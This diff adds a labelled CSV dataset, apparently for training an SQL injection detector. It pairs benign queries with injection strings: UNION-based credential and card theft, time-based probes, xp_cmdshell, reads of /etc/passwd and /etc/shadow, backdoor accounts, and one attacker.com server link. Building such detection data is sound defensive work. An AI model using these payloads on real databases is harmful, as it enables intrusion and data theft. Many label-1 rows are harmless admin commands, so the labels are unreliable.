@@ -1,0 +1,285 @@
+query,label
+"SELECT * FROM users WHERE id = 1",0
+"SELECT * FROM products WHERE name = 'laptop'",0
+"SELECT id, username FROM users WHERE active = 1",0
+"INSERT INTO orders (user_id, product_id) VALUES (5, 10)",0
+"UPDATE users SET email = 'john@example.com' WHERE id = 3",0
+"DELETE FROM sessions WHERE expired = 1",0
+"SELECT * FROM employees WHERE department = 'Engineering'",0
+"SELECT count(*) FROM orders WHERE status = 'pending'",0
+"SELECT name, price FROM products WHERE category = 'electronics'",0
+"SELECT * FROM users WHERE username = 'admin'",0
+"INSERT INTO logs (action, timestamp) VALUES ('login', NOW())",0
+"SELECT * FROM customers WHERE email = 'user@test.com'",0
+"UPDATE products SET stock = stock - 1 WHERE id = 42",0
+"SELECT order_id, total FROM orders WHERE user_id = 15",0
+"SELECT * FROM items WHERE price BETWEEN 10 AND 100",0
+"SELECT * FROM users WHERE created_at > '2024-01-01'",0
+"SELECT username, email FROM users LIMIT 10",0
+"SELECT * FROM products ORDER BY price DESC",0
+"SELECT DISTINCT category FROM products",0
+"SELECT * FROM users WHERE role = 'customer'",0
+"SELECT * FROM orders WHERE total > 500",0
+"INSERT INTO reviews (user_id, rating, comment) VALUES (8, 5, 'Great!')",0
+"SELECT * FROM products WHERE name LIKE '%phone%'",0
+"SELECT user_id, count(*) FROM orders GROUP BY user_id",0
+"SELECT * FROM users WHERE id IN (1, 2, 3)",0
+"UPDATE users SET last_login = NOW() WHERE id = 7",0
+"SELECT * FROM categories WHERE parent_id IS NULL",0
+"SELECT * FROM users JOIN orders ON users.id = orders.user_id",0
+"SELECT product_name, SUM(quantity) FROM sales GROUP BY product_name",0
+"SELECT * FROM users WHERE username = 'john_doe' AND active = 1",0
+"SELECT * FROM products WHERE stock > 0 ORDER BY name",0
+"INSERT INTO cart (user_id, product_id, quantity) VALUES (12, 5, 2)",0
+"SELECT * FROM orders WHERE status = 'shipped' AND user_id = 9",0
+"UPDATE products SET price = 29.99 WHERE id = 15",0
+"SELECT * FROM users WHERE email_verified = 1",0
+"SELECT id, title FROM articles WHERE published = 1",0
+"SELECT * FROM comments WHERE article_id = 23 ORDER BY created_at",0
+"DELETE FROM cart WHERE user_id = 4 AND product_id = 8",0
+"SELECT * FROM products WHERE discount > 0",0
+"SELECT username FROM users WHERE id = (SELECT user_id FROM sessions WHERE token = 'abc123')",0
+"SELECT * FROM users WHERE registration_date >= '2023-01-01'",0
+"INSERT INTO notifications (user_id, message) VALUES (6, 'New order')",0
+"SELECT * FROM orders JOIN products ON orders.product_id = products.id",0
+"SELECT * FROM users WHERE phone_number = '123-456-7890'",0
+"UPDATE orders SET status = 'delivered' WHERE id = 100",0
+"SELECT * FROM products WHERE rating >= 4.5",0
+"SELECT * FROM users WHERE last_name = 'Smith'",0
+"SELECT order_date, total FROM orders WHERE MONTH(order_date) = 12",0
+"SELECT * FROM inventory WHERE warehouse = 'A' AND quantity < 10",0
+"SELECT * FROM users WHERE account_type = 'premium'",0
+"SELECT * FROM products WHERE brand = 'Apple' OR brand = 'Samsung'",0
+"INSERT INTO addresses (user_id, street, city) VALUES (3, '123 Main St', 'NYC')",0
+"SELECT * FROM orders WHERE payment_method = 'credit_card'",0
+"SELECT username, email FROM users WHERE newsletter_subscribed = 1",0
+"SELECT * FROM products WHERE weight < 5.0",0
+"UPDATE users SET profile_complete = 1 WHERE id = 11",0
+"SELECT * FROM categories ORDER BY sort_order ASC",0
+"SELECT * FROM users WHERE referral_code = 'SAVE20'",0
+"SELECT * FROM orders WHERE shipping_cost = 0",0
+"SELECT * FROM products WHERE release_date = '2024-06-15'",0
+"SELECT * FROM users WHERE login_attempts < 3",0
+"SELECT * FROM items WHERE condition = 'new'",0
+"INSERT INTO wishlist (user_id, product_id) VALUES (14, 22)",0
+"SELECT * FROM products WHERE color = 'black' AND size = 'XL'",0
+"SELECT * FROM users WHERE timezone = 'UTC-5'",0
+"SELECT * FROM orders WHERE tracking_number IS NOT NULL",0
+"UPDATE products SET featured = 1 WHERE id IN (10, 20, 30)",0
+"SELECT * FROM users WHERE password_reset_token IS NULL",0
+"SELECT * FROM products WHERE manufacturer = 'Sony'",0
+"SELECT * FROM orders WHERE coupon_code = 'SUMMER10'",0
+"SELECT id, name FROM users WHERE country = 'USA'",0
+"SELECT * FROM products WHERE tags LIKE '%wireless%'",0
+"SELECT * FROM users WHERE two_factor_enabled = 1",0
+"INSERT INTO payments (order_id, amount, method) VALUES (50, 99.99, 'paypal')",0
+"SELECT * FROM products WHERE warranty_months = 24",0
+"SELECT * FROM users WHERE marketing_emails = 0",0
+"SELECT * FROM orders WHERE is_gift = 1",0
+"SELECT * FROM products WHERE dimensions = '10x5x3'",0
+"SELECT * FROM users WHERE preferred_language = 'en'",0
+"UPDATE users SET notification_preferences = 'all' WHERE id = 18",0
+"SELECT * FROM products WHERE energy_rating = 'A+'",0
+"SELECT * FROM orders WHERE fulfillment_status = 'processing'",0
+"SELECT * FROM users WHERE age_verified = 1",0
+"SELECT * FROM products WHERE material = 'leather'",0
+"SELECT username, total_spent FROM users WHERE loyalty_points > 1000",0
+"INSERT INTO returns (order_id, reason, status) VALUES (75, 'defective', 'pending')",0
+"SELECT * FROM products WHERE compatible_with = 'iPhone 15'",0
+"SELECT * FROM users WHERE subscription_expires > NOW()",0
+"SELECT * FROM orders WHERE is_recurring = 1",0
+"SELECT * FROM products WHERE assembly_required = 0",0
+"SELECT * FROM users WHERE communication_preference = 'sms'",0
+"SELECT * FROM products WHERE country_of_origin = 'Japan'",0
+"UPDATE orders SET delivery_instructions = 'Leave at door' WHERE id = 88",0
+"SELECT * FROM users WHERE vip_status = 1",0
+"SELECT * FROM products WHERE eco_friendly = 1",0
+"SELECT * FROM orders WHERE gift_message IS NOT NULL",0
+"SELECT * FROM products WHERE battery_life_hours > 10",0
+"SELECT * FROM users WHERE social_login_provider = 'google'",0
+"' OR 1=1 --",1
+"' UNION SELECT username, password FROM users --",1
+"DROP TABLE users",1
+"'; DROP TABLE users --",1
+"SELECT * FROM users WHERE username = '' OR '1'='1'",1
+"' UNION SELECT NULL, table_name FROM information_schema.tables --",1
+"1; EXEC xp_cmdshell('net user')",1
+"' OR '1'='1' /*",1
+"' UNION SELECT credit_card, cvv FROM payments --",1
+"DELETE FROM users WHERE 1=1",1
+"UPDATE users SET role='admin' WHERE username='attacker'",1
+"'; INSERT INTO users (username, password, role) VALUES ('hacker', 'pass123', 'admin') --",1
+"' OR username LIKE '%admin%'",1
+"' UNION ALL SELECT NULL, CONCAT(username, ':', password) FROM users --",1
+"SELECT * FROM users WHERE id = 1 OR 1=1",1
+"'; EXEC master..xp_cmdshell 'dir c:\\' --",1
+"' HAVING 1=1 --",1
+"' GROUP BY columnname HAVING 1=1 --",1
+"' ORDER BY 10--",1
+"' UNION SELECT password FROM users WHERE username='admin'--",1
+"1' AND '1'='1",1
+"' AND (SELECT COUNT(*) FROM users) > 0--",1
+"'; WAITFOR DELAY '0:0:5'--",1
+"' OR SLEEP(5)--",1
+"1' WAITFOR DELAY '00:00:10'--",1
+"' AND BENCHMARK(5000000,MD5('test'))--",1
+"' UNION SELECT LOAD_FILE('/etc/passwd')--",1
+"'; SELECT pg_sleep(10)--",1
+"1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",1
+"' UNION SELECT @@version--",1
+"' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT password FROM users LIMIT 1)))--",1
+"1' UNION SELECT NULL, table_name FROM information_schema.tables--",1
+"' OR 1=1 LIMIT 1--",1
+"'; CREATE TABLE malicious (data VARCHAR(100))--",1
+"' UNION SELECT user(), database()--",1
+"1' OR '1'='1' UNION SELECT password FROM users WHERE username='administrator'--",1
+"'; ALTER TABLE users ADD COLUMN backdoor VARCHAR(50)--",1
+"' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables))--",1
+"1'; DROP PROCEDURE sp_config--",1
+"' OR EXISTS(SELECT * FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')--",1
+"'; EXEC sp_addlogin 'backdoor', 'password'--",1
+"' UNION SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'users')--",1
+"1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='database_name')>0--",1
+"'; BACKUP DATABASE mydb TO DISK='C:\\backup.bak'--",1
+"' OR 1=1; SELECT * FROM users--",1
+"'; SHUTDOWN WITH NOWAIT--",1
+"1' UNION SELECT NULL, credit_card_number FROM payments WHERE user_id=1--",1
+"' HAVING LENGTH(password)>5--",1
+"'; GRANT ALL PRIVILEGES ON *.* TO 'attacker'@'%'--",1
+"' OR username='' AND password='' OR ''='",1
+"1'; EXEC xp_regread 'HKEY_LOCAL_MACHINE', 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run'--",1
+"' UNION SELECT TO_CHAR(username) || TO_CHAR(password) FROM users--",1
+"'; CREATE OR REPLACE FUNCTION backdoor() RETURNS VOID AS $$ BEGIN EXECUTE 'CREATE USER hacker WITH SUPERUSER'; END; $$ LANGUAGE plpgsql--",1
+"1' AND (SELECT ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)))>64--",1
+"'; LOAD DATA INFILE '/tmp/data.csv' INTO TABLE users--",1
+"' OR (SELECT COUNT(*) FROM users WHERE role='admin')>0--",1
+"1' UNION SELECT GROUP_CONCAT(username, ':', password) FROM users--",1
+"'; SELECT * INTO OUTFILE '/tmp/users.csv' FIELDS TERMINATED BY ',' FROM users--",1
+"' AND UPDATEXML(1, CONCAT(0x7e,(SELECT password FROM users LIMIT 1)),1)--",1
+"1'; sp_configure 'show advanced options', 1; RECONFIGURE--",1
+"' OR 1=1; INSERT INTO audit_log (action) VALUES ('unauthorized_access')--",1
+"'; DROP FUNCTION IF EXISTS calculate_total--",1
+"' UNION SELECT schema_name FROM information_schema.schemata--",1
+"1' AND (SELECT LENGTH(password) FROM users WHERE username='admin')>8--",1
+"'; CREATE TRIGGER backdoor_trigger AFTER INSERT ON users FOR EACH ROW BEGIN INSERT INTO backdoor_table VALUES (NEW.username, NEW.password); END--",1
+"' OR 'x'='x' UNION SELECT token FROM api_keys WHERE user_id=1--",1
+"'; EXECUTE IMMEDIATE 'GRANT DBA TO attacker'--",1
+"1' AND (SELECT COUNT(*) FROM users WHERE SUBSTRING(password,1,1)='a')>0--",1
+"'; MERGE INTO users USING (SELECT 'hacker' AS username, 'pass' AS password FROM dual) ON (1=1) WHEN MATCHED THEN UPDATE SET password='compromised'--",1
+"' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--",1
+"; DROP INDEX idx_user_email--",1
+"' OR (SELECT TOP 1 password FROM users) IS NOT NULL--",1
+"1' AND EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE 'a%')--",1
+"'; CREATE VIEW admin_users AS SELECT * FROM users WHERE role='admin'--",1
+"' UNION SELECT DISTINCT table_name FROM information_schema.tables WHERE table_schema=database()--",1
+"'; TRUNCATE TABLE audit_logs--",1
+"1' OR (SELECT COUNT(*) FROM information_schema.columns WHERE column_name='password')>0--",1
+"'; RENAME TABLE users TO users_backup--",1
+"' AND (SELECT COUNT(*) FROM users GROUP BY role HAVING COUNT(*)>5)--",1
+"'; CREATE SEQUENCE backdoor_seq START WITH 1 INCREMENT BY 1--",1
+"' OR 1=1 UNION SELECT id, CONCAT(email, ':', api_key) FROM users--",1
+"'; DROP VIEW IF EXISTS user_summary--",1
+"1' AND (SELECT COUNT(*) FROM users WHERE activated=1)>10--",1
+"'; ALTER USER 'root'@'localhost' IDENTIFIED BY 'newpassword'--",1
+"' UNION SELECT privilege_type FROM information_schema.user_privileges--",1
+"'; INSERT INTO mysql.user (User, Password) VALUES ('backdoor', PASSWORD('secret'))--",1
+"1' OR (SELECT COUNT(*) FROM orders WHERE total>1000)>0--",1
+"'; FLUSH PRIVILEGES--",1
+"' AND (SELECT COUNT(DISTINCT role) FROM users)>3--",1
+"'; CREATE INDEX idx_password ON users(password)--",1
+"' UNION SELECT host, user FROM mysql.user--",1
+"'; DELETE FROM logs WHERE action='failed_login'--",1
+"1' AND (SELECT MAX(id) FROM users)>100--",1
+"'; UPDATE users SET password=MD5('hacked') WHERE username='admin'--",1
+"' OR EXISTS(SELECT * FROM information_schema.tables WHERE table_name LIKE '%credit_card%')--",1
+"'; CREATE PROCEDURE get_all_users() BEGIN SELECT * FROM users; END--",1
+"1' UNION SELECT NULL, CONCAT(username, password) FROM users LIMIT 1,1--",1
+"'; DISABLE TRIGGER ALL ON users--",1
+"' AND (SELECT COUNT(*) FROM users WHERE last_login > NOW() - INTERVAL 7 DAY)>0--",1
+"'; DROP SEQUENCE IF EXISTS order_seq--",1
+"' OR (SELECT COUNT(*) FROM products WHERE price<0)>0--",1
+"'; CREATE TABLE temp_users AS SELECT * FROM users--",1
+"1' AND (SELECT COUNT(*) FROM sessions WHERE token IS NOT NULL)>0--",1
+"'; EXEC sp_executesql N'SELECT * FROM users'--",1
+"' UNION SELECT name, type FROM sysobjects--",1
+"'; KILL 55--",1
+"1' OR (SELECT COUNT(*) FROM orders WHERE status='pending')>5--",1
+"'; REVOKE ALL ON database.* FROM 'user'@'localhost'--",1
+"' AND (SELECT COUNT(*) FROM users WHERE failed_attempts>3)>0--",1
+"'; OPTIMIZE TABLE users--",1
+"' UNION SELECT GRANTEE, PRIVILEGE_TYPE FROM information_schema.role_table_grants--",1
+"'; SET GLOBAL general_log = 'ON'--",1
+"1' AND (SELECT COUNT(*) FROM products WHERE stock<10)>0--",1
+"'; DROP DATABASE IF EXISTS test_db--",1
+"' OR (SELECT COUNT(*) FROM users WHERE password_reset_expires>NOW())>0--",1
+"'; CREATE USER 'temp_admin'@'localhost' IDENTIFIED BY 'temp123'--",1
+"1' UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema='mysql'--",1
+"'; ANALYZE TABLE users--",1
+"' AND (SELECT COUNT(*) FROM orders JOIN users ON orders.user_id=users.id)>0--",1
+"'; CHECKSUM TABLE users--",1
+"' OR (SELECT COUNT(*) FROM information_schema.processlist)>5--",1
+"'; PURGE BINARY LOGS BEFORE '2024-01-01 00:00:00'--",1
+"1' AND (SELECT COUNT(*) FROM users WHERE created_at>NOW()-INTERVAL 30 DAY)>0--",1
+"'; RESET MASTER--",1
+"' UNION SELECT db_name(), @@version--",1
+"'; SHOW GRANTS FOR 'root'@'localhost'--",1
+"1' OR (SELECT COUNT(*) FROM users WHERE is_admin=1)>0--",1
+"'; REPAIR TABLE users--",1
+"' AND (SELECT COUNT(*) FROM information_schema.triggers)>0--",1
+"'; CREATE EVENT cleanup_event ON SCHEDULE EVERY 1 DAY DO DELETE FROM logs WHERE created_at<NOW()-INTERVAL 30 DAY--",1
+"' OR (SELECT COUNT(*) FROM users WHERE email_verified=0)>10--",1
+"'; DROP EVENT IF EXISTS cleanup_event--",1
+"1' AND (SELECT COUNT(*) FROM products JOIN categories ON products.category_id=categories.id)>0--",1
+"'; LOCK TABLES users WRITE--",1
+"' UNION SELECT routine_name, routine_type FROM information_schema.routines--",1
+"'; UNLOCK TABLES--",1
+"1' OR (SELECT COUNT(*) FROM orders WHERE payment_status='failed')>0--",1
+"'; CREATE INDEX idx_email ON users(email)--",1
+"' AND (SELECT COUNT(*) FROM users WHERE two_factor_enabled=0)>0--",1
+"'; DROP INDEX idx_email ON users--",1
+"' OR (SELECT COUNT(*) FROM information_schema.statistics)>0--",1
+"'; ALTER TABLE users MODIFY COLUMN password VARCHAR(255)--",1
+"1' AND (SELECT COUNT(*) FROM users WHERE subscription_type='premium')>0--",1
+"'; CREATE TEMPORARY TABLE temp_sessions AS SELECT * FROM sessions--",1
+"' UNION SELECT trigger_name, event_object_table FROM information_schema.triggers--",1
+"'; DROP TEMPORARY TABLE IF EXISTS temp_sessions--",1
+"1' OR (SELECT COUNT(*) FROM products WHERE discontinued=1)>0--",1
+"'; SET SQL_MODE='TRADITIONAL'--",1
+"' AND (SELECT COUNT(*) FROM orders WHERE is_refunded=1)>0--",1
+"'; SHOW PROCESSLIST--",1
+"' OR (SELECT COUNT(*) FROM users WHERE account_locked=1)>0--",1
+"'; KILL QUERY 123--",1
+"1' AND (SELECT COUNT(*) FROM products WHERE featured=1)>0--",1
+"'; FLUSH TABLES WITH READ LOCK--",1
+"' UNION SELECT event_name, status FROM information_schema.events--",1
+"'; UNLOCK TABLES--",1
+"1' OR (SELECT COUNT(*) FROM users WHERE login_count>50)>0--",1
+"'; SET FOREIGN_KEY_CHECKS=0--",1
+"' AND (SELECT COUNT(*) FROM orders WHERE shipping_method='express')>0--",1
+"'; SET FOREIGN_KEY_CHECKS=1--",1
+"' OR (SELECT COUNT(*) FROM products WHERE on_sale=1)>0--",1
+"'; CREATE TABLE IF NOT EXISTS backdoor (cmd TEXT)--",1
+"1' AND (SELECT COUNT(*) FROM users WHERE referral_id IS NOT NULL)>0--",1
+"'; INSERT INTO backdoor (cmd) VALUES ('malicious_code')--",1
+"' UNION SELECT plugin_name, plugin_status FROM information_schema.plugins--",1
+"'; SELECT LOAD_FILE('/etc/shadow')--",1
+"1' OR (SELECT COUNT(*) FROM users WHERE preferred_language='es')>0--",1
+"'; SELECT INTO OUTFILE '/tmp/data.txt' FIELDS TERMINATED BY ',' FROM users--",1
+"' AND (SELECT COUNT(*) FROM products WHERE warranty_active=1)>0--",1
+"'; CREATE SERVER remote_server FOREIGN DATA WRAPPER mysql OPTIONS (HOST 'attacker.com')--",1
+"' OR (SELECT COUNT(*) FROM orders WHERE coupon_used IS NOT NULL)>0--",1
+"'; INSTALL PLUGIN backdoor_plugin SONAME 'backdoor.so'--",1
+"1' AND (SELECT COUNT(*) FROM users WHERE notification_enabled=1)>0--",1
+"'; UNINSTALL PLUGIN backdoor_plugin--",1
+"' UNION SELECT engine, support FROM information_schema.engines--",1
+"'; CREATE TABLE users_backup SELECT * FROM users--",1
+"1' OR (SELECT COUNT(*) FROM products WHERE pre_order=1)>0--",1
+"'; DROP TABLE IF EXISTS users_backup--",1
+"' AND (SELECT COUNT(*) FROM orders WHERE gift_wrap=1)>0--",1
+"'; ALTER DATABASE mydb CHARACTER SET utf8mb4--",1
+"' OR (SELECT COUNT(*) FROM users WHERE marketing_consent=1)>0--",1
+"'; SHOW VARIABLES LIKE '%version%'--",1
+"1' AND (SELECT COUNT(*) FROM products WHERE bundle_deal=1)>0--",1
+"'; SET GLOBAL max_connections=1000--",1
+"' OR (SELECT COUNT(*) FROM users WHERE data_retention_consent=0)>0--",1
+"'; SHOW STATUS--",1
